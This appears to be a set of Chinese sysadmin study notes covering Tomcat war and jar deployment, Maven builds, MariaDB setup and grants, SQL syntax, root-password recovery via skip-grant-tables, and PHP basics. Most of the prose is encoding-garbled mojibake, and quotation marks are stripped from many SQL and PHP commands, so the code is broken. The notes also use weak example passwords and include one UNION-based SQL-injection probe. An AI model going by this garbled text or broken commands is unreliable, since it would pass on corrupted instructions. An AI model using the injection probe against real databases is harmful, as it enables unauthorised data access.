jaråŒ…é™¤äº†å¯ä»¥æ‰“åŒ…ä¸€äº›javaç¼–å†™çš„ç‰¹å®šåŠŸèƒ½çš„æ’ä»¶ä¹‹å¤–ï¼Œåœ¨é¡¹ç›®éƒ¨ç½²æ–¹é¢ç”¨çš„ä¹Ÿæ¯”è¾ƒå¤šï¼Œç”¨jaråŒ…åšé¡¹ç›®éƒ¨ç½²çš„æ—¶å€™ï¼Œä¸€èˆ¬jaråŒ…ä¸­ä¼šç›´æ¥æ‰“åŒ…ä¸Šwebserverçš„ç¨‹åºï¼Œæ¯”å¦‚tomcatï¼Œæ‰€ä»¥ç›´æ¥è¿è¡ŒjaråŒ…ï¼Œé¡¹ç›®å°±è¿è¡Œèµ·æ¥äº†ï¼Œä¸éœ€è¦å»å®‰è£…tomcatä¹‹ç±»çš„webserverã€‚jar åŒ…æ˜¯é€šè¿‡ JavaSE ç¨‹åºæ‰“æˆçš„åŒ…ã€‚ waråŒ…æ˜¯åœ¨ç½‘ç«™é¡¹ç›®éƒ¨ç½²çš„æ—¶å€™ç”¨çš„æ¯”è¾ƒå¤šï¼Œå®ƒä¹Ÿæ˜¯æ‰“åŒ…çš„javaæºä»£ç ç¨‹åºï¼Œä½†æ˜¯é‡Œé¢æ˜¯ç«™ç‚¹æºä»£ç ï¼Œä¸åŒ…å«webserverç¨‹åºã€‚waråŒ…æ˜¯ https://www.zrlog.com/ï¼Œå¯ä»¥è‡ªè¡Œä¸‹è½½waråŒ…ã€‚war åŒ…æ˜¯ JavaWeb ç¨‹åºæ‰“çš„åŒ…ã€‚ ## éƒ¨ç½²ä¸€ä¸‹ä¸Šé¢è¿™ä¸ªæ–‡ä»¶ã€‚æ³¨æ„ï¼Œå¦‚æœä½ çš„tomcatæœåŠ¡å™¨é‡æ–°å¯åŠ¨è¿‡ï¼Œæ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤æ¥å¯åŠ¨tomcat /app/apache-tomcat-8.0.27/bin/startup.sh[root@192 etc]# cd /app/apache-tomcat-8.0.27/webapps/[root@192 webapps]# ls docs examples host-manager manager ROOT[root@192 webapps]# rz -E rz waiting to receive.[root@192 webapps]# ls # waråŒ…ä¸Šä¼ è¿‡æ¥ä¹‹åï¼Œtomcatä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬è§£å‹waråŒ…ï¼Œå¦‚æœä½ lsæŸ¥çœ‹ä¸åˆ°ï¼Œç¨ç­‰ä¸€ä¼šå°±çœ‹åˆ°äº†ï¼Œè§£å‹å‡ºæ¥çš„zrlogç›®å½•docs examples host-manager manager ROOT zrlog zrlog.war# ç„¶åå°±å¯ä»¥ç›´æ¥è®¿é—®ç½‘ç«™äº† ä½†æ˜¯éœ€è¦æˆ‘ä»¬å¡«å†™ä¸€äº›æ•°æ®åº“çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿˜æ²¡æœ‰ï¼Œéœ€è¦å®‰è£…å¹¶åˆ›å»ºæ•°æ®åº“ã€‚ yum install mariadb-server -y[root@localhost webapps]# systemctl start mariadb.service [root@localhost webapps]# systemctl enable mariadb.service [root@localhost webapps]# mysql_secure_installation # åšä¸€ä¸‹å®‰å…¨åˆå§‹åŒ–å§ï¼Œè¿æ¥èµ·æ¥æ›´é¡ºç•…# å®‰å…¨åˆå§‹åŒ–çš„è¿‡ç¨‹ä¸­è®¾ç½®ä¸€ä¸ªrootå¯†ç å§ï¼Œæˆ‘è®¾ç½®çš„æ˜¯123456ï¼Œå‰©ä¸‹çš„ä¸€è·¯yå³å¯# è¿æ¥ä¸€ä¸‹çœ‹æ•ˆæœï¼š[root@localhost webapps]# mysql -u root -p123456# åˆ›å»ºæ•°æ®åº“MariaDB [(none)] create database zrlog;Query OK, 1 row affected (0.00 sec)MariaDB [(none)] show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || zrlog |+--------------------+4 rows in set (0.00 sec)MariaDB [(none)] exit ç„¶åå›åˆ°ç½‘ç«™è¿›è¡Œåˆå§‹åŒ–ï¼š 3-2 ä½¿ç”¨jaréƒ¨ç½²å°è¯´ç½‘ç«™ä¸‹è½½ä¸ªæ‰“åŒ…ä¸ºjaråŒ…çš„webé¡¹ç›®ä»£ç æ¥éƒ¨ç½²ä¸€ä¸‹å§ã€‚ https://github.com/hectorqin/reader/releases/tag/v2.6.2ï¼Œä¸‹è½½è¿™ä¸ªé¡¹ç›®ï¼Œå¦‚ä¸‹ï¼Œä¸ä¸‹è½½æœ€æ–°çš„ï¼Œæœ€ æ–°çš„éœ€è¦æˆæƒæ‰èƒ½ä¸‹è½½ã€‚ ç„¶åå¯ä»¥çœ‹ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£ï¼Œé‡Œé¢æœ‰éƒ¨ç½²æ•™ç¨‹ï¼š # å…ˆå…³é—­tomcatï¼Œä¸ç„¶æœ‰å†²çªï¼Œå› ä¸ºè¿™ä¸ªjarè¿è¡Œèµ·æ¥ä¹‹åä½¿ç”¨çš„ä¹Ÿæ˜¯8080ç«¯å£[root@localhost webapps]# /app/apache-tomcat-8.0.27/bin/shutdown.shcd /opt/ # éšä¾¿æ‰¾ä¸ªç›®å½•ï¼Œæ¯”å¦‚å°±optå§#ä¸Šä¼ åˆšæ‰ä¸‹è½½çš„jaråŒ…åˆ°optç›®å½•ä¸‹# ç„¶åæ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤ï¼šjava -jar reader-$version.jar --reader.app.secure=true --reader.app.secureKey=ç®¡ç†å¯†ç  --reader.app.inviteCode=æ³¨å†Œé‚€è¯·ç # æŒ‡ä»¤ç¨ä½œè°ƒæ•´ï¼Œç®¡ç†å‘˜å¯†ç ï¼š12345678ï¼Œæ³¨å†Œé‚€è¯·ç 8888ï¼Œreader-$version.jaræ”¹ä¸ºæˆ‘ä»¬ä¸‹è½½çš„åŒ…åreader-2.6.2.jarï¼Œé»˜è®¤çš„ç®¡ç†å‘˜åç§°ä¸ºdefaultjava -jar reader-2.6.2.jar --reader.app.secure=true --reader.app.secureKey=12345678 --reader.app.inviteCode=8888# java -jar reader-2.6.2.jar #ç›´æ¥è¿è¡Œè¿™ä¸ªæŒ‡ä»¤æ˜¯å•ç”¨æˆ·æ¨¡å¼å¯åŠ¨ç½‘ç«™ã€‚ 3.26.4 mavenç¼–è¯‘javaæºä»£ç  ä¸Šä¼ åˆ°æˆ‘ä»¬çš„tomcatæœåŠ¡å™¨ä¸Š cd /opt/unzip è§£å‹ä¸€ä¸‹cd jaden-mastertreevim pom.xml #è¿™ä¸ªé…ç½®æ–‡ä»¶ä¸­æœ‰æŒ‡å®šï¼Œæ‰“åŒ…çš„æ—¶å€™æ‰“åŒ…æˆwaråŒ…è¿˜æ˜¯jaråŒ…# packagingwar/packaging # è¿™é‡Œå†™çš„æ˜¯æ‰“ä¸€ä¸ªwaråŒ…# éœ€è¦å®‰è£…ç¼–è¯‘å™¨æ‰èƒ½æ‰“åŒ…ï¼Œæ‰“åŒ…æŒ‡ä»¤ä¸ºmvnï¼Œæ˜¯mavençš„ç¼©å†™ã€‚ mavenç¼–è¯‘ # å®‰è£…mavenç¼–è¯‘å™¨wget http://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gztar xf apache-maven-3.6.3-bin.tar.gz -C /usr/local/ # -Cæ˜¯è§£å‹åˆ°æŸä¸ªç›®å½•ln -s /usr/local/apache-maven-3.6.3 /usr/local/maven # ç»™mavenåˆ›å»ºä¸€ä¸ªçŸ­ä¸€ç‚¹çš„è·¯å¾„ï¼Œæ–‡ä»¶åç§°å¤ªé•¿äº†ï¼Œln -sæ˜¯åˆ›å»ºè½¯é“¾æ¥çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯å¿«æ·æ–¹å¼çš„æ„æ€ã€‚vim /etc/profile#æ–‡ä»¶ç»“å°¾æ·»åŠ ä¸¤è¡ŒGexport M2_HOME=/usr/local/mavenexport PATH=$M2_HOME/bin:$PATH:wqsource /etc/profile#éªŒè¯mvn -v# cdåˆ°æºä»£ç ç›®å½•cd jaden-master # ç¡®ä¿è¯¥ç›®å½•ä¸‹æœ‰pom.xmlé…ç½®æ–‡ä»¶#æ‰“åŒ…å‘½ä»¤mvn clean package#æ‰“åŒ…çš„æ—¶é—´ä¸€èˆ¬éƒ½æ¯”è¾ƒé•¿ï¼Œå› ä¸ºä¼šä¸‹è½½å„ç§æ‰“åŒ…éœ€è¦çš„ä¾èµ–æ–‡ä»¶ã€‚# æ‰“åŒ…å®Œæˆä¹‹åå¤šäº†ä¸€ä¸ªtargetç›®å½•ï¼Œåœ¨targetç›®å½•ä¸­å¯ä»¥çœ‹åˆ°SpringBootWeb.warè¿™ä¸ªæ‰“åŒ…å¥½çš„waråŒ…ã€‚# æŠŠSpringBootWeb.warç§»åŠ¨åˆ°tomcatçš„webappsç›®å½•ä¸­ï¼Œæ”¹ä¸ªçŸ­ä¸€äº›çš„åå­—ï¼Œæ¯”å¦‚å«åšjaden.war# å¯åŠ¨tomcat# ç„¶åè®¿é—®ä¸€ä¸‹å°±çœ‹åˆ°ç½‘ç«™æ•ˆæœäº†ã€‚# javaä»£ç çš„æ‰“åŒ…å·¥å…·æœ‰ï¼šmavenã€gradleã€antç­‰ï¼Œå‰ä¸¤ä¸ªç”¨çš„å±…å¤šã€‚ 3.26.5 å°†ç½‘ç«™æ‰“åŒ…æˆappæ‰“åŒ…ç«™ç‚¹ç½‘å€ï¼šhttps://appdabao.yimenapp.com/ å››ï¼ŒMySQL4.1 mysqlå®‰è£…#centos7é»˜è®¤å®‰è£…çš„æ˜¯MariaDB-5.5.68æˆ–è€…65ï¼Œ#æŸ¥çœ‹ç‰ˆæœ¬çš„æŒ‡ä»¤ï¼š[root@web01 bbs]# rpm -qa| grep mariadb#å®‰è£…mariadbçš„æœ€æ–°ç‰ˆï¼Œåªæ˜¯æ›´æ–°äº†è½¯ä»¶ç‰ˆæœ¬ï¼Œä¸ä¼šåˆ é™¤ä¹‹å‰åŸæœ‰çš„æ•°æ®ã€‚#ä¿®æ”¹yumæºçš„é…ç½®æ–‡ä»¶vim /etc/yum.repos.d/mariadb.repoi[mariadb]name=mariadb laster versionbaseurl=http://mirrors.tuna.tsinghua.edu.cn/mariadb/yum/10.6/centos7-amd64/gpgcheck=0#yumå®‰è£…mariadbyum install mariadb-server -y#é‡æ–°å¯åŠ¨mariadbå¹¶è®¾ç½®å¼€æœºè‡ªå¯systemctl start mariadbsystemctl enable mariadb# å®‰è£…å®Œä¹‹åå»ºè®®è¿è¡Œä¸€ä¸‹å®‰å…¨åˆå§‹åŒ–çš„åŠ¨ä½œï¼šmysql_secure_installation 4-2 æˆæƒ#æˆæƒ ï¼Œé»˜è®¤æƒ…å†µä¸‹mysqlå’Œmariadbéƒ½æ˜¯ä¸å…è®¸rootç”¨æˆ·è¿œç¨‹è¿æ¥ç™»å½•çš„ã€‚# grant æ“ä½œ(å¢åˆ æ”¹æŸ¥ï¼Œall) on åº“å.è¡¨å to ç”¨æˆ·å@% identified by å¯†ç ;grant all on *.* to root@192.168.31.% identified by aini;grant all on wordpress.* to wordpress@192.168.61.% identified by 123456;grant all on wordpress.t1 to jaden@192.168.61.% identified by 123; #jadenç”¨æˆ·åªèƒ½å¯¹menuè¡¨è¿›è¡Œæ“ä½œ# ç½‘ç«™ä»£ç ä¸­è¿æ¥æ•°æ®åº“çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯å“ªä¸ªç”¨æˆ·ï¼Œé‚£ä¸ªç”¨æˆ·æœ‰ä»€ä¹ˆæƒé™ï¼Œé‚£ä¹ˆç½‘ç«™ä»£ç å°±èƒ½å¯¹æ•°æ®åº“åšä»€ä¹ˆæ“ä½œã€‚## æŸ¥çœ‹æŸä¸ªç”¨æˆ·æœ‰å“ªäº›æƒé™show grants for root@%;# å•ç‹¬åˆ›å»ºç”¨æˆ·create user wang@% identified by 123;# å•ç‹¬åˆ›å»ºçš„ç”¨æˆ·æ˜¯æ²¡æœ‰ä»»ä½•æƒé™çš„ï¼Œåªèƒ½ç™»å½•ï¼Œéœ€è¦æˆæƒgrant all on wordpress.* to wang@%;# ä¸Šé¢ä¸¤æ¡å°±ç­‰äºæˆ‘ä»¬å‰é¢æˆæƒåŠ åˆ›å»ºç”¨æˆ·çš„ä¸€æ¡æŒ‡ä»¤ã€‚# åˆ é™¤ç”¨æˆ·drop user wang@%;# æŸ¥çœ‹ç”¨æˆ·çš„æƒé™show grants for jaden@192.168.61.%;# å›æ”¶æƒé™ï¼š æ³¨æ„ï¼šåªæœ‰åœ¨æœ¬æœºç™»å½•çš„rootç”¨æˆ·æ‰æœ‰è¿™ä¸ªèƒ½åŠ›revoke select on wordpress.t1 from jaden@192.168.61.%; show grants for jaden@192.168.61.%; 4-3 ç™»å½•ä¿®æ”¹å¯†ç #ä½¿ç”¨æ™®é€šç”¨æˆ·ç™»å½•mysql -u wordpress -p123456 -h 10.0.0.7#é»˜è®¤çš„æ•°æ®æ–‡ä»¶å­˜å‚¨ä½ç½®æ˜¯/var/lib/mysql/#/root/.mysql_history è®°å½•äº†æˆ‘ä»¬åšçš„å†å²sqlæŒ‡ä»¤# ä¿®æ”¹ç”¨æˆ·å¯†ç #å®‰å…¨åˆå§‹åŒ–ï¼Œå¯ä»¥ä¿®æ”¹rootç”¨æˆ·çš„å¯†ç ï¼šmysql_secure_installationæ ¼å¼ï¼šmysql set password for ç”¨æˆ·å@localhost = password(æ–°å¯†ç ); ä¾‹å­ï¼šmysql set password for root@localhost = password(123); # æŸ¥è¯¢å½“å‰æ˜¯åœ¨å“ªä¸ªåº“é‡Œé¢MariaDB [mysql] select database();#æŸ¥çœ‹è¡¨ç»“æ„desc songs;+---------+--------------+------+---- 4-4 MySQLæ•°æ®ç±»å‹int æ•´å½¢ æ•°å­— é€‚åˆå­˜å‚¨ï¼šå¹´é¾„ï¼Œ åŠ å‡è¿ç®—float æµ®ç‚¹å‹ é€‚åˆå­˜å‚¨ï¼šä½™é¢ åŠ å‡è¿ç®—char å­—ç¬¦ä¸² é€‚åˆå­˜å‚¨ï¼šä¸åšåŠ å‡è¿ç®— èº«ä»½å·ç  å¯†ç ï¼Œå•è¡Œä¿¡æ¯text æ–‡æœ¬ é€‚åˆå­˜å‚¨ï¼š é€‚åˆå¤šè¡Œä¿¡æ¯ï¼Œå°è¯´ï¼Œå•†å“æè¿°enum æšä¸¾ é€‚åˆå­˜å‚¨ï¼š å›ºå®šé€‰é¡¹ï¼Œå¤šé€‰ä¸€date æ—¥æœŸç±»å‹ é€‚åˆå­˜å‚¨ï¼šæ—¶é—´ï¼Œä¸€èˆ¬å­˜å‚¨çš„æ˜¯unixæ—¶é—´æˆ³ï¼Œä»1970.1.1 0:0:0åˆ°ç°åœ¨è¿‡äº†å¤šå°‘ç§’ï¼Œè¿™ä¸ªæ—¶é—´æˆ³æ˜¯å¯ä»¥è½¬åŒ–ä¸ºå…·ä½“çš„æ—¶é—´ æ—¥æœŸçš„ã€‚boolean å¸ƒå°”ç±»å‹ true/false å¯¹åº”æ•°å­—å°±æ˜¯0/é0 4-5 æ‰€æœ‰çš„æ•´å‹int 4-6 å­—ç¬¦ä¸²ç±»å‹ 4-7 textç±»å‹ 4-8 MySQLå®Œæ•´æ€§çº¦æŸnot null # ä¸èƒ½ä¸ºç©ºï¼Œé»˜è®¤æ˜¯å¯ä»¥ä¸ºç©ºçš„default # default 100ï¼Œæ„æ€æ˜¯é»˜è®¤å€¼ä¸º100unique # å”¯ä¸€auto_increment # è‡ªå¢primary key #ä¸»é”®ï¼šnot null+uniqueï¼Œè¿˜è‡ªå¸¦auto_incrementè‡ªå¢å±æ€§ï¼Œä½†æ˜¯æ¯ä¸ªè¡¨é‡Œé¢åªèƒ½æœ‰ä¸€åˆ—èƒ½ä¸ºprimary keyä¸»é”®åˆ—unsigned #åªèƒ½å­˜æ­£æ•´æ•°ï¼Œé»˜è®¤æ˜¯å¯ä»¥å­˜æ­£æ•°å’Œè´Ÿæ•°çš„ 4-9 MySQLæ•°æ®è¡¨æ“ä½œ#åˆ‡æ¢åº“use linux;#åˆ›å»ºè¡¨ #æ¯ä¸ªwebé¡¹ç›®å…¶å®éƒ½ä¼šåˆ›å»ºå¾ˆå¤šä¸ªè¡¨æ¥å­˜å‚¨ä¸åŒçš„æ•°æ®create table è¡¨å(å­—æ®µå1 ç±»å‹[(å®½åº¦) çº¦æŸæ¡ä»¶],å­—æ®µå2 ç±»å‹[(å®½åº¦) çº¦æŸæ¡ä»¶], å­—æ®µå3 ç±»å‹[(å®½åº¦) çº¦æŸæ¡ä»¶]);ç¤ºä¾‹ï¼šmysql create table jaden( - id int, - name varchar(50), - age int(3) - );#æŸ¥çœ‹ä¸€ä¸‹mysqlå¸®æˆ‘ä»¬åˆ›å»ºè¡¨çš„æ—¶å€™çš„è¯¦ç»†æŒ‡ä»¤ show create table jaden; #åˆ›å»ºåº“å’Œåˆ›å»ºè¡¨çš„æ—¶å€™è¿˜å¯ä»¥æŒ‡å®šå­—ç¬¦é›†ç¼–ç ï¼Œé»˜è®¤å­—ç¬¦é›†æ˜¯Latinã€‚ DEFAULT CHARACTER SET utf8mb4 create table jaden(id int, name varchar(50)) ENGINE=MyISAM DEFAULT CHARSET=utf8;# ENGINE=MyISAMè¿™æ˜¯æŒ‡å®šå­˜å‚¨å¼•æ“ï¼Œè¿™ä¸ªåé¢è¯´ã€‚#å¾€è¡¨é‡Œé¢æ’å…¥æ•°æ® insert into jaden(id,name,age) value(1,xx,18); # æ’å…¥å•æ¡æ•°æ® insert into jaden(id,name,age) values(2,xx2,15),(3,xx3,19); #æ’å…¥å¤šæ¡æ•°æ® #åˆ›å»ºåªæœ‰nameåˆ—çš„è¡¨t1; create table t1(name char(6));#æŸ¥çœ‹è¡¨ç»“æ„ desc t1;#å¾€è¡¨t1æ’å…¥æ•°æ® insert t1 value(zhang); insert t1 value(li);#æŸ¥è¯¢t1è¡¨ä¸­æ‰€æœ‰æ•°æ® select * from t1;#æŒ‡å®šå­—ç¬¦é›†çš„åˆ›è¡¨è¯­å¥ create table t2(name char(6),age int(3)) default charset=utf8;#å¾€è¡¨t2æ’å…¥æ•°æ® insert t2 value(å¼ ä¸‰,20); insert t2 value(æå››,60);#åˆ›å»ºè¡¨t4 create table t4(name char(6),age int(3) default 0 ) default charset=utf8;#æŒ‡å®šåˆ—æ’å…¥æ•°æ® insert t4(name) values(å¼ ä¸‰),(æå››);#æŸ¥è¯¢ç»“æœ mysql select * from t4; +--------+------+ | name | age | +--------+------+ | å¼ ä¸‰ | 0 | | æå›› | 0 | +--------+------+ 2 rows in set (0.00 sec)##ä¿®æ”¹è¡¨#ä¿®æ”¹å­—æ®µçš„é•¿åº¦ alter table s2 modify name char(10);#æŸ¥çœ‹åˆ›è¡¨è¯­å¥ show create table s2;#å¢åŠ å­—æ®µ alter table s2 add age int(3);#åˆ é™¤å­—æ®µ alter table s2 drop age;#ALTER TABLE è¡¨å ADD å­—æ®µå æ•°æ®ç±»å‹ [å®Œæ•´æ€§çº¦æŸæ¡ä»¶â€¦] FIRST; #æ·»åŠ è¿™ä¸ªå­—æ®µçš„æ—¶å€™ï¼ŒæŠŠå®ƒæ”¾åˆ°ç¬¬ä¸€ä¸ªå­—æ®µä½ç½®å»ã€‚#ALTER TABLE è¡¨å ADD å­—æ®µå æ•°æ®ç±»å‹ [å®Œæ•´æ€§çº¦æŸæ¡ä»¶â€¦] AFTER å­—æ®µå;#afteræ˜¯æ”¾åˆ°åçš„è¿™ä¸ªå­—æ®µçš„åé¢å»äº†ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªfirstå’Œä¸€ä¸ªafterå°±å¯ä»¥å°†æ–°æ·»åŠ çš„å­—æ®µæ”¾åˆ°è¡¨çš„ä»»æ„å­—æ®µä½ç½®äº†ã€‚# ä¿®æ”¹è¡¨çš„å­—ç¬¦é›† alter table è¡¨å charset=utf8mb4;#ä½¿ç”¨whereæ¡ä»¶åˆ é™¤å•æ¡æ•°æ® delete from t5 where name=zhangsan;#åˆ é™¤æ‰€æœ‰æ•°æ® delete from t5;#å•æ¡ä»¶ä¿®æ”¹ï¼š update t5 set password=123 where name=wangwu;#å•æ¡ä»¶ä¿®æ”¹å¤šåˆ—ï¼š update t5 set password=123,name=xxx where name=wangwu;#å¤šæ¡ä»¶ä¿®æ”¹ update t5 set password=123 where name=wangwu and id=1; update t5 set password=123 where name=wangwu or id=1;#ä¿®æ”¹æ‰€æœ‰æ•°æ® update t5 set password=123456; 4-10 MySQLæŸ¥è¯¢æ•°æ®#sqlæŸ¥è¯¢## cityæœ‰å¤šå°‘ä¸ªä¸­å›½çš„åŸå¸‚ï¼Ÿselect * from city where CountryCode=CHN;## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œå±±è¥¿çœçš„åŸå¸‚åï¼Ÿselect * from city where district=shanxi;## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œå±±è¥¿çœå’Œæ²³åŒ—çœçš„åŸå¸‚åï¼Ÿselect * from city where district=shanxi or district=hebei ;## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œå±±è¥¿çœå’Œæ²³åŒ—çœçš„åŸå¸‚ä¸­äººå£å¤§äº100wï¼Ÿselect * from city where (district=shanxi or district=hebei) and Population 1000000 ;## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œè¦æ±‚åªæ˜¾ç¤ºåŸå¸‚åå’Œäººå£æ•°é‡ï¼Œå±±è¥¿çœå’Œæ²³åŒ—çœçš„åŸå¸‚åæŒ‰äººå£æ•°é‡æ’åºï¼Œå‡åºï¼Ÿselect Name,Population from city where district=shanxi or district=hebeiorder by Population ;## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œè¦æ±‚åªæ˜¾ç¤ºåŸå¸‚åå’Œäººå£æ•°é‡ï¼Œå±±è¥¿çœå’Œæ²³åŒ—çœçš„åŸå¸‚åæŒ‰äººå£æ•°é‡æ’åºï¼Œé™åºï¼Ÿselect Name,Population from city where district=shanxi or district=hebeiorder by Population desc ;## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œè¦æ±‚åªæ˜¾ç¤ºåŸå¸‚åå’Œäººå£æ•°é‡ï¼Œå±±è¥¿çœå’Œæ²³åŒ—çœçš„åŸå¸‚åæŒ‰äººå£æ•°é‡å‰5åï¼›select Name,Population from city where district=shanxi or district=hebeiorder by Population desc limit 5;## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œè¦æ±‚åªæ˜¾ç¤ºåŸå¸‚åå’Œäººå£æ•°é‡ï¼Œå±±è¥¿çœå’Œæ²³åŒ—çœçš„åŸå¸‚åæŒ‰äººå£æ•°é‡ç¬¬2åå’Œç¬¬3åï¼›select Name,Population from city where district=shanxi or district=hebeiorder by Population desc limit 1,2;## æŸ¥è¯¢cityè¡¨ä¸­,æ‰€æœ‰ä¸­å›½çœä»½ä¸­å¸¦ançš„åŸå¸‚select * from city where countrycode=chn and district like %an% ;## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œæ‰€æœ‰ä¸­å›½çš„åŸå¸‚äººå£åœ¨89000å’Œ89999ä¹‹é—´çš„åŸå¸‚select * from city where countrycode=chn and Population between 89000 and 89999 ;## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œè¦æ±‚åªæ˜¾ç¤ºåŸå¸‚åå’Œäººå£æ•°é‡,æŸ¥è¯¢CHNäººå£æœ€å¤šçš„å‰5ä¸ªåŸå¸‚ï¼Ÿ## æŸ¥è¯¢cityè¡¨ä¸­ï¼Œè¦æ±‚åªæ˜¾ç¤ºåŸå¸‚åå’Œäººå£æ•°é‡,æŸ¥è¯¢CHNäººå£æœ€å°‘çš„å‰5ä¸ªåŸå¸‚ï¼Ÿ## æŸ¥è¯¢ä¸­å›½çš„åŸå¸‚æ•°é‡ï¼Ÿselect count(name) as ä¸­å›½åŸå¸‚æ€»æ•° from city where countrycode=CHN;## æŸ¥è¯¢ä¸–ç•Œçš„å›½å®¶æ•°é‡ï¼Ÿselect count(name) from country;## æŸ¥è¯¢ä¸­å›½çš„æ€»äººå£ï¼Ÿselect sum(population) from city where countrycode=chn;## æŠŠå¤šè¡Œåˆå¹¶æˆä¸€è¡Œselect group_concat(name) from city where countrycode=chn and district=hebei;## æŠŠå¤šåˆ—åˆå¹¶æˆä¸€åˆ—select concat(Name,#,CountryCode,#,District) from city where countrycode=chn and district=hebei ; 4-11 MySQL ç´¢å¼•#å¢åŠ ä¸»é”®ç´¢å¼•(è¦æ±‚ç»“æœå”¯ä¸€) alter table t100w add PRIMARY KEY(id);#åˆ›å»ºæ™®é€šç´¢å¼• alter table t100w add index num(num); #åˆ›å»ºè”åˆç´¢å¼• alter table t100w add index lianhe(k1,k2);#æŸ¥çœ‹ç´¢å¼• show index from t100w;#åˆ é™¤æ™®é€šç´¢å¼• alter table t100w drop index lianhe;#åˆ é™¤ä¸»é”®ç´¢å¼• alter table t100w drop PRIMARY key;#åˆ›å»ºè¡¨çš„æ—¶å€™ï¼ŒæŒ‡å®šç´¢å¼• create table zhu2(id int(8) primary key AUTO_INCREMENT ,name char(10),passwd char(10)); 4-12 MySQL Union#åˆå¹¶ä¸¤ä¸ªselectæŸ¥è¯¢ç»“æœCREATE TABLE `c1` ( `ID` int NOT NULL AUTO_INCREMENT, `Name` char(35) NOT NULL DEFAULT , `District` char(20) NOT NULL DEFAULT , `Population` int NOT NULL DEFAULT 0, PRIMARY KEY (`ID`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `c2` ( `ID` int NOT NULL AUTO_INCREMENT, `Name` char(35) NOT NULL DEFAULT , `District` char(20) NOT NULL DEFAULT , `Population` int NOT NULL DEFAULT 0, PRIMARY KEY (`ID`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;insert into c1(ID,Name,District,Population) select ID,Name,District,Population from city where CountryCode=CHN and District=Hebei;insert into c2(ID,Name,District,Population) select ID,Name,District,Population from city where CountryCode=CHN and District=Henan;select * from c1 union select * from c2 order by Population;#sqlæ³¨å…¥ä¸­ç»å¸¸ä¼šä½¿ç”¨çš„select * from c1 union select 1,2,3,user(); 4-13 mysqlå­˜å‚¨å¼•æ“MyISAMï¼š ## è¯»æ€§èƒ½å¥½ï¼Œå†™çš„æ€§èƒ½å·® è¡¨çº§é” æ¯å¼ è¡¨ï¼Œä¸‰ä¸ªæ–‡ä»¶innodbï¼š ## è¯»æ€§èƒ½å¾®å¼±ï¼Œå†™çš„æ€§èƒ½å¥½ è¡Œçº§é” æ¯å¼ è¡¨ï¼Œä¸¤ä¸ªæ–‡ä»¶ 4-14 MySQLæ‰¾å›rootå¯†ç #bé€‚ç”¨äºmariadb 10.61.ä¿®æ”¹é…ç½®æ–‡ä»¶ vim /etc/my.cnf.d/server.cnf [mysqld] skip-grant-tables 2.å¯åŠ¨mariadb systemctl start mariadb 3.ç©ºå¯†ç  ç™»å½•æ•°æ®åº“å¹¶æ‰§è¡Œä¿®æ”¹å¯†ç  use mysql; update user set password=password(123) where user=root and host=localhost; flush privileges; 4.åˆ é™¤é…ç½®æ–‡ä»¶ä¸­å‰é¢å¢åŠ çš„skip-grant-tables5.é‡å¯å¯åŠ¨mariadb systemctl restart mariadb6.ä½¿ç”¨æ–°å¯†ç éªŒè¯ mysql -uroot -p123 äº”ï¼ŒPHP1ï¼Œå˜é‡å’Œå¸¸é‡#PHP ä¸­çš„å˜é‡ç”¨ä¸€ä¸ªç¾å…ƒç¬¦å·åé¢è·Ÿå˜é‡åæ¥è¡¨ç¤ºã€‚å˜é‡åæ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚#å®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œå‰é¢ä¸åŠ $ç¬¦å·ï¼Œé‚£ä¹ˆå°±æ˜¯æ™®é€šå­—ç¬¦ $num = 3.1415; $a = 5; $b = 6; echo $a + $b; $hello world# å®šä¹‰å¸¸é‡ï¼š# å¸¸é‡çš„åä¸€èˆ¬éƒ½æ˜¯å¤§å†™å­—æ¯ // æ–¹å¼1ï¼šdefine(å¸¸é‡å, å¸¸é‡å€¼); ä¾‹å¦‚ï¼šdefine(WebSite, phpä¸­æ–‡ç½‘);// æ–¹å¼2ï¼šconst å¸¸é‡å = å¸¸é‡å€¼; ä¾‹å¦‚ï¼šconst FOO = BAR;// æ–¹å¼2ä¸èƒ½ç”¨åœ¨ifåˆ¤æ–­ä¸­ã€‚ 2,ä¸å¸¦ç¬¦å·ï¼Œå•å¼•å·ï¼ŒåŒå¼•å·çš„åŒºåˆ«?phpheader(Content-Type: text/html; charset=utf-8); // åœ¨å“åº”å¤´ä¸­æ·»åŠ äº†content-type: // utf-8ï¼Œheader()æ˜¯phpæä¾›çš„åŠ å·¥å“åº”å¤´é”®å€¼å¯¹çš„// header(jaden: 666); $name = kobe;echo $name;echo æœ€å–œæ¬¢çš„NBAçƒæ˜Ÿæ˜¯.$name.br; //å˜é‡ä¸åŠ ç¬¦å·ï¼Œé‡åˆ°å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œéœ€è¦åŠ .è¿æ¥echo æœ€å–œæ¬¢çš„NBAçƒæ˜Ÿæ˜¯$namebr; //å•å¼•å·ï¼Œä¸è§£æå˜é‡ï¼ŒåŸæ ·è¾“å‡ºecho æœ€å–œæ¬¢çš„NBAçƒæ˜Ÿæ˜¯$namebr; //åŒå¼•å·ï¼Œè§£æå˜é‡? 3,phpçš„æ•°æ®ç±»å‹â—¾å¸ƒå°”ç±»å‹ 0 é0 |false true # åˆ¤æ–­æ¡ä»¶çš„ç»“æœéƒ½æ˜¯å¸ƒå°”å€¼â—¾æ•´å‹ æ•´æ•° 